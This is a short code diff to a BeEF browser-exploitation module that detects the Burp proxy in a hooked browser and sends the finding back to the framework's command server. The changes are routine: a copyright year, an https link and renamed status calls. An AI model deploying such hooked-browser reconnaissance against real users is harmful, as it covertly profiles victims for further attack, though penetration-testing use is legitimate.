@@ -1,6 +1,6 @@
 //
-// Copyright (c) 2006-2021 Wade Alcorn - wade@bindshell.net
-// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
@@ -18,10 +18,10 @@ beef.execute(function() {
       var response = FindProxyForURL('', '');
       beef.debug("Response: " + response);
       beef.net.send("<%= @command_url %>", <%= @command_id %>,
-        "has_burp=true&response=" + response, beef.are.status_success());
+        "has_burp=true&response=" + response, beef.status.success());
     } catch(e) {
       beef.debug("Response: " + e.message);
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_burp=false", beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_burp=false", beef.status.error());
     }
   }
 
